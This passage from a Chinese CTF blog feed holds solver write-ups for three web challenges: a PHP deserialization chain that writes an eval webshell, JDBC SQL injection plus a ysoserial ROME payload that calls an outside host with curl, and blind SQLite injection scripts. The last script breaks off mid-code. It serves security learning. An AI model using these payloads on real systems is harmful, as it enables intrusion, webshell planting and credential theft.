class="token keyword">return</span> <span class="token string double-quoted-string">"You don't look very happy"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Yongen</span><span class="token punctuation">&#123;</span> <span class="token comment">//flag.php</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">text</span> <span class="token operator">=</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hasaki</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("nononon");?>'</span><span class="token punctuation">;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$d</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">text</span><span class="token punctuation">;</span>        @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Yasuo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hasaki</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"I'm the best happy windy man"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造pop链</p><pre class="line-numbers language-none"><code class="language-none">GWHT::__toString() -&gt; Yongen::hasaki()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>思路很简单</p><p>有死亡exit/die，所以用伪协议绕过。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$filename &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php&#39;;$data &#x3D; &#39;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4&#x3D;&#39;;$add_str &#x3D; &#39;111&#39;;$d &#x3D; &#39;&lt;?php die(&quot;nononon&quot;);?&gt;&#39;;$data &#x3D; $d . $add_str . $data;file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$add_str</code>一个一个加字符测试</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer/image-20211022165504082.png"></p><p>然后，问题是，如何触发GWHT类的<code>__toString()</code>？，反序列化点又在哪里？？？</p><p>百度了一圈，WP基本都没说……拿arjun爆破</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-EasySer/image-20211022205329460.png"></p><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">GWHT</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hero</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Yongen</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$text</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GWHT</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">hero</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yongen</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">hero</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource=shell.php'</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">hero</span><span class="token operator">-></span><span class="token property">text</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'111'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4='</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload打入</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;star1.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;ser.php&amp;c&#x3D;O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A43%3A%22111PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4%3D%22%3B%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连接，结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[网鼎杯 2020 朱雀组]Think Java</title>
      <link href="/p/701889044.html"/>
      <url>/p/701889044.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[java|jdbc|sql注入|ysoserial|java反序列化|ROME]</p><p>给了部分class</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211017233225722.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cn<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>core<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">cn<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>common<span class="token punctuation">.</span>bean<span class="token punctuation">.</span></span><span class="token class-name">ResponseCode</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">cn<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>common<span class="token punctuation">.</span>bean<span class="token punctuation">.</span></span><span class="token class-name">ResponseResult</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">cn<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>common<span class="token punctuation">.</span>security<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Access</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">cn<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>core<span class="token punctuation">.</span>sqldict<span class="token punctuation">.</span></span><span class="token class-name">SqlDict</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">cn<span class="token punctuation">.</span>abc<span class="token punctuation">.</span>core<span class="token punctuation">.</span>sqldict<span class="token punctuation">.</span></span><span class="token class-name">Table</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span></span><span class="token class-name">ApiOperation</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">CrossOrigin</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">PostMapping</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span><span class="token annotation punctuation">@CrossOrigin</span><span class="token annotation punctuation">@RestController</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/common/test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/sqlDict"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@Access</span>    <span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"为了开发方便对应数据库字典查询"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">ResponseResult</span> <span class="token function">sqlDict</span><span class="token punctuation">(</span><span class="token class-name">String</span> dbName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Table</span><span class="token punctuation">></span></span> tables <span class="token operator">=</span> <span class="token class-name">SqlDict</span><span class="token punctuation">.</span><span class="token function">getTableData</span><span class="token punctuation">(</span>dbName<span class="token punctuation">,</span> <span class="token string">"root"</span><span class="token punctuation">,</span> <span class="token string">"abc@12345"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">ResponseResult</span><span class="token punctuation">.</span><span class="token function">e</span><span class="token punctuation">(</span><span class="token class-name">ResponseCode</span><span class="token punctuation">.</span>OK<span class="token punctuation">,</span> tables<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>看class，感觉就是sql注入，但问题是要找到输入点。</p><p>有swagger，默认是<code>/swagger-ui.html</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211019141541525.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211019141701028.png"></p><p>在这有字符串拼接的sql，可以尝试sql注入</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211019142127846.png"></p><h3 id="jdbc的sql注入"><a href="#jdbc的sql注入" class="headerlink" title="jdbc的sql注入"></a>jdbc的sql注入</h3><blockquote><p>jdbc连接数据库语句后面可以跟参数</p></blockquote><pre class="line-numbers language-none"><code class="language-none">jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;数据库名?user&#x3D;用户名&amp;password&#x3D;密码&amp;useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf-8&amp;serverTimezone&#x3D;GMT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211019142513265.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211019143910826.png" alt="image-20211019143910826"></p><p>在这有个问题，首先他要在连接数据库的时候拼接字符串，又在sql语句里拼接，如果按照以前sql注入那样闭合+注释，就会导致在执行jdbc的时候直接报错。但还好，jdbc对于<code>#?</code>有特殊的处理</p><h4 id="号问题"><a href="#号问题" class="headerlink" title="#?号问题"></a>#?号问题</h4><p><code>#</code>在jdbc中无实际意义且#号后面的会被忽视。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211019143108255.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211019143811632.png"></p><p><code>?</code>也是一样的，不过需要加个键值对。</p><pre class="line-numbers language-none"><code class="language-none">jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;myapp?a&#x3D;1&#39; union select 1#jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;myapp#&#39; union select 1#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是，类似sql注入，位置在这，字段名也是有的。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021204759858.png"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;common&#x2F;test&#x2F;sqlDict?dbname&#x3D;myapp#&#39; union select pwd from user#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆出密码<code>admin@Rrrr_ctf_asde</code>，同样操作爆出用户名为<code>admin</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021204915497.png"></p><p>然后登陆</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021205659126.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021205715349.png"></p><p>返回了一个auth头</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021210931531.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021211058858.png"></p><h3 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h3><p>下方的特征可以作为序列化的标志参考:</p><blockquote><p>一段数据以<code>rO0AB</code>开头，你基本可以确定这串就是Java序列化base64加密的数据。<br>或者如果以<code>aced</code>开头，那么他就是这一段Java序列化的16进制。</p></blockquote><p>而这段数据正好是<code>rO0AB</code>，意味着可以尝试反序列化。</p><p>这段可以base64解码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021210216573.png"></p><h3 id="java反序列化-1"><a href="#java反序列化-1" class="headerlink" title="java反序列化"></a>java反序列化</h3><p>怪，用自己的vps可以，用beeceptor就不行。</p><h4 id="burp插件"><a href="#burp插件" class="headerlink" title="burp插件"></a>burp插件</h4><p>扫出来是ROME类型</p><blockquote><p>rome可以命令执行，URLDNS可以进行dns回显</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021225722579.png"></p><p>直接在插件里写好要执行的命令直接打。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021232526192.png"></p><h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h4><p>无语，翻了下工具记录，才发现这题我做过。</p><pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar ROME &quot;curl https:&#x2F;&#x2F;asdfasdf.free.beeceptor.com&quot; | base64 -w 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/image-20211021232741643.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[BSidesCF 2019]Sequel</title>
      <link href="/p/3809605982.html"/>
      <url>/p/3809605982.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Sequel/image-20211016142356388.png"></p><p>感觉像是sql注入</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>似乎有检测，先fuzz一下。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Sequel/image-20211016142951989.png"></p><p>被屏蔽的有点多，看样子并非是黑名单，而是白名单模式。</p><p>先扫个目录看看有没有源码泄漏。</p><p>试了半天不行，看了下wp才知道原来注入点不在这，先爆破用户密码为guest，整了半天赛道都没找到。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Sequel/image-20211016144659921.png"></p><p>给了提示，需要admin</p><p>看看cookie，是个base64，解个码</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Sequel/image-20211016145236961.png"></p><p>再替换成admin加密。</p><p>报invalid。</p><p>原来sql注入点在这。而且还是sqlite。</p><h3 id="sqlite注入要点"><a href="#sqlite注入要点" class="headerlink" title="sqlite注入要点"></a>sqlite注入要点</h3><p>这个sqlite_master就类似于mysql的information_schema</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> sqlite_master <span class="token punctuation">(</span> <span class="token keyword">type</span> <span class="token keyword">TEXT</span><span class="token punctuation">,</span> name <span class="token keyword">TEXT</span><span class="token punctuation">,</span> tbl_name <span class="token keyword">TEXT</span><span class="token punctuation">,</span> rootpage <span class="token keyword">INTEGER</span><span class="token punctuation">,</span> <span class="token keyword">sql</span> <span class="token keyword">TEXT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Sequel/image-20211016174235420.png"></p><p>写exp的时候，要注意先是要符合一开始的json格式，然后把里面的值作为字符串拼接到sql语句里，所以是这样的，需要用<code>\</code>转义</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"\" or 1=1 or \""</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"guest"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://370d0ebd-78f4-4fc1-aa6c-943b03ea68ac.node4.buuoj.cn:81/sequels"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        tmp <span class="token operator">=</span> flag <span class="token operator">+</span> i        <span class="token keyword">if</span> i <span class="token keyword">in</span> <span class="token string">'%_'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">if</span> tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'n'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">elif</span> tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'r'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">elif</span> tmp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'s'</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        u <span class="token operator">=</span> <span class="token string">r'\" or EXISTS(SELECT name from sqlite_master where name like \"&#123;&#125;\" limit 1) or \"'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>            tmp <span class="token operator">+</span> <span class="token string">'%'</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">'&#123;"username":"%s","password":"guest"&#125;'</span> <span class="token operator">%</span> u        <span class="token comment"># print(payload)</span>        cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"1337_AUTH"</span><span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Movie"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag <span class="token operator">=</span> tmp            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>库</p><pre class="line-numbers language-none"><code class="language-none">notes reviews reviews sqlite userinfo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>试了下用<code>limit 1 offset 3</code>似乎不太行，可能是因为偶尔返回的顺序不一致。</p><p>结果还是得从开头入手，如果有前几个字母同名的表那就难办了。</p><p>sqlite里没有if/chr/asc，不过也可以这样来配合二分法判断加速判断。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BSidesCF-2019-Sequel/image-20211016214942747.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64<span class="token keyword">import</span> string<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://0eaa6072-56ef-4b36-9ba7-a0e1d673c493.node4.buuoj.cn:81/sequels"</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>            tmp <span class="token operator">=</span> flag <span class="token operator">+</span> i            u <span class="token operator">=</span> <span class="token string">r'\" or (substr((select password from userinfo limit &#123;&#125;,1),&#123;&#125;,1)=\"&#123;&#125;\") or \"'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                x<span class="token punctuation">,</span> n<span class="token punctuation">,</span> i<span class="token punctuation">)</span>            payload <span class="token operator">=</span> <span class="token string">'&#123;"username":"%s","password":"guest"&#125;'</span> <span class="token operator">%</span> u            <span class="token comment"># print(payload)</span>            cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"1337_AUTH"</span><span class="token punctuation">:</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token string">"Movie"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>                flag <span class="token operator">=</span> 